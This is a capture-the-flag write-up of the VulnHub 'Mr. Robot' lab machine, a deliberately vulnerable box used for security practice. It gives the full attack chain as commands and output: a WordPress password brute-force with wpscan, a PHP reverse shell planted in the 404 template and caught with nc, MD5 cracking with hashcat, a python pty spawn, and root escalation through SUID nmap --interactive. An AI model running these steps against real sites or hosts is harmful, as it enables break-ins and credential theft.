---
title: "VulnHub: Mr. Robot - Writeup"
excerpt: Writeup for Mr. Robot from VulnHub
date: 2019-07-04 00:00:00
categories: [cybersec, infosec, vulnhub]
tags: [mr. robot, php, privilege escalation, reverse shell, wordpress]
---

## Information
Mr. Robot is a simple-intermediate level box on VulnHub that is based on the popular TV series of the same name; Mr. 
Robot. The box has 3 keys to capture and the box aims to make the pentester utilize various tools and methods to 
capture these keys. This includes various ways to establish a reverse shell as well as various ways to find possible 
vulnerabilities in the system.

## Tasks
- Capture all 3 keys
 
## Summary
- Use `nmap` to see the services
- Use `gobuster` to find the hidden web directories and capture `key-1-of-3.txt`
- Use `wpscan` to find possible vulnerabilities in the `Wordpress` installation and brute-force login
- Implement a reverse shell in one of the pages via `Editor` and use `nc` to catch the reverse shell
- Crack the MD5 via `hashcat` and to spawn a shell with `python` to login as `robot` to capture `key-2-of-3.txt`
- Find possible vulnerabilities in the shell via `LinEnum` to escalate privileges to `root` and capture`key-3-of-3.txt`
 
## Tools Used
- `nmap`
- `gobuster`
- `wpscan`
- `php-reverse-shell`
- `nc`
- `hashcat`
- `python`
- `LinEnum`

## Walkthrough
### nmap
We first begin with a pretty basic and standard `nmap` scan to see the services and what we're dealing with.

```
$ nmap -sC -sV 192.168.2.243

[...]

Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)

[...]
```

We have `HTTP` on Port 80 and a closed `SSH` on Port 22.

### HTTP
Taking a look at the `HTTP` by visiting `192.168.2.243` reveals an animated terminal and a message from Mr. Robot.

![Mr. Robot][Mr. Robot]

There are some commands we can input but none of them reveal anything useful to help us capture our first key. Thus we 
must scan for hidden directories with `gobuster`. Do note that `directory-list-2.3-medium.txt` was copied from 
`/usr/share/wordlists/dirbuster/`.

```
$ gobuster dir -u 192.168.2.243 -w directory-list-2.3-medium.txt
  
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.2.243/
[+] Threads      : 10
[+] Wordlist     : directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/07/02 14:27:47 Starting gobuster
=====================================================
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/video (Status: 301)
/feed (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/intro (Status: 200)
/wp-login (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
/dashboard (Status: 302)
/%!(NOVERB) (Status: 301)
/wp-admin (Status: 301)
/phpmyadmin (Status: 403)
/0000 (Status: 301)
/IMAGE (Status: 301)
/wp-signup (Status: 302)
/KeithRankin%!(NOVERB) (Status: 301)
/kaspersky%!(NOVERB) (Status: 301)
/page01 (Status: 301)
/Cirque%!d(MISSING)u%!s(MISSING)oleil%!(NOVERB) (Status: 301)
=====================================================
2019/07/02 15:54:29 Finished
=====================================================
```

We now know that the website has `Wordpress` installed and there are several interesting directories. Taking a  look at 
`/robots` displays a raw paste that reveals two other hidden directories.

![robots.txt][robots.txt]

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Visiting `fsocity.dic` allows us to download a dictionary file that we'll probably use later. Visiting `key-1-of-3.txt` 
lets us access our first key; `073403c8a58a1f80d943455fb30724b9`.

### Wordpress
Since we know `Wordpress` is present on this machine, we'll try to access the admin console over at `/wp-admin`. Since 
we don't know the name of the users on this machine, we'll use `Lost Your Password?` and try various usernames related 
to the TV show to see if anything matches. `admin`,` fsociety`, `robot`, and `mrrobot` were no match but `elliot` was, 
indicating `elliot` is a known user in the system. 

Using `wpscan` we can scan the `Wordpress` installation and plugins for possible vulnerabilities and try to brute-force 
login as `elliot`. Since we were given `fsocity.dic` earlier, it would make sense to use it as our wordlist.

```
$ wpscan --url 192.168.2.243 --passwords fsocity.dic --usernames elliot

_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.5.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.2.243/
[+] Started: Tue Jul  2 18:35:02 2019

Interesting Finding(s):

[+] http://192.168.2.243/
| Interesting Entries:
|  - Server: Apache
|  - X-Mod-Pagespeed: 1.9.32.3-4523
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] http://192.168.2.243/robots.txt
| Found By: Robots Txt (Aggressive Detection)
| Confidence: 100%

[+] http://192.168.2.243/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
|  - http://codex.wordpress.org/XML-RPC_Pingback_API
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.2.243/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] http://192.168.2.243/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
|  - https://www.iplocation.net/defend-wordpress-from-ddos
|  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.19 identified (Latest, released on 2019-03-13).
| Detected By: Rss Generator (Aggressive Detection)
|  - http://192.168.2.243/feed/, <generator>https://wordpress.org/?v=4.3.19</generator>
|  - http://192.168.2.243/comments/feed/, <generator>https://wordpress.org/?v=4.3.19</generator>

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:00 <============================================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
Progress Time: 00:57:11 <==========================================================================================================================> (1716 / 1716) 100.00% Time: 00:57:11
WARNING: Your progress bar is currently at 1716 out of 1716 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.
Progress Time: 00:57:12 <==========================================================================================================================> (1716 / 1716) 100.00% Time: 00:57:12
[SUCCESS] - elliot / ER28-0652                                                                                                                                                           
All Found                                                                                                                                                                                


[i] Valid Combinations Found:
| Username: elliot, Password: ER28-0652

[...]
```

`wpscan` found `elliot`'s password to be `ER28-0652`. We can now access `Wordpress`.

![Wordpress - Panel][Wordpress - Panel]

Checking the panel there is nothing of interest aside images in `Media` and 2 users in `Users` where we only see 
`elliot` and `mich05654` who's name is Krista Gordon; Elliot's shrink in the TV series. 

![Wordpress - Users][Wordpress - Users]

### Getting a Reverse Shell Via Wordpress
Let's get a reverse shell using the panel. To do that we'll use [this][PHP Reverse Shell] PHP Reverse Shell script by 
[pentestmoney][pentestmonkey]. When attempted to upload to Wordpress you're not permitted to upload it.

![Wordpress - Denied][Wordpress - Denied]

As a result, we must attempt another way to upload our script. Luckily we can access `Appearance/Editor` and edit 
webpages of our choosing. Pasting the script to `404 Template` will suffice as the shell will initiate once we load 
`http://192.168.2.243/404.php`.

![Wordpress - 404][Wordpress - 404]

```
$ curl http://192.168.2.243/404.php

$ nc -v -n -l -p 7500

listening on [any] 7500 ...
connect to [192.168.2.112] from (UNKNOWN) [192.168.2.243] 50652
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
19:30:11 up  4:26,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off

$ pwd
/

$ cd /home

$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot

$ cd /home/robot

$ ls -la

total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied

$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

We got access to the machine and navigating to `/home/robot` revealed 2 files; `key-2-of-3.txt` and `password.md5-raw`. 
Attempting to read `key-2-of-3.txt` doesn't work as we need to login as `robot`. To do that we must crack `robot`'s 
password, which is stored as a `MD5` hash in `password.raw-md5`.

### Logging in as Robot
We know our hash is `MD5` so using `hashcat` with `rockyou.txt` from `/usr/share/wordlists/rockyou.txt` we can 
commence a dictionary attack to crack it. Do note that `rockyou.txt` was copied from `/usr/share/wordlists/rockyou.txt`.

```
$ hashcat -m 0 -a 0 -d 1 --force hash.txt rockyou.txt

[...]

c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
                                                 
[...]
```

Now let's attempt to switch users in the shell with our password

```
$ su robot
su: must be run from a terminal
```

We need to spawn a proper shell if we want to switch users. To do that we'll use `python`.

```
$ python -c 'import pty; pty.spawn("/bin/sh")'

$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

After spawning `/bin/sh` using `pty` from `python`, we can read `key-2-of-3.txt` and capture our second key.

### Logging in as Root
To capture our final flag we'll have to login as `root`. Since we have no clues regarding what the password for it 
might be, we must attempt privilege escalation. Using [LinEnum][LinEnum], we can scan for possible vulnerabilities in 
the system.

```
$ cd /tmp
cd /tmp

$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

$ chmod +x LinEnum.sh

$ ./LinEnum.sh

[...]

### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget
/usr/local/bin/nmap
/usr/bin/gcc
/usr/bin/curl

[...]

[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap

[...]


```

`LinEnum` revealed a `SUID` regarding `nmap`. Checking its version; `3.81`, is a version that is known to be 
vulnerable to a certain privilege escalation attacking using `--interactive`.

```
$ nmap --interactive
nmap --interactive


Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh

# whoami
whoami
root

# cd /root
cd /root

# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd

# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Thus we've captured our third and final key.

[Mr. Robot]:            /images/posts/2019-07-04-vulnhub-mr_robot/Mr.%20Robot.png
[robots.txt]:           /images/posts/2019-07-04-vulnhub-mr_robot/Robots.png
[Wordpress - Panel]:    /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Panel.png
[Wordpress - Users]:    /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Users.png
[PHP Reverse Shell]:    http://pentestmonkey.net/tools/web-shells/php-reverse-shell
[pentestmonkey]:        http://pentestmonkey.net/
[Wordpress - Denied]:   /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20Denied.png
[Wordpress - 404]:      /images/posts/2019-07-04-vulnhub-mr_robot/Wordpress%20-%20404%20Template.png
[LinEnum]:              https://github.com/rebootuser/LinEnum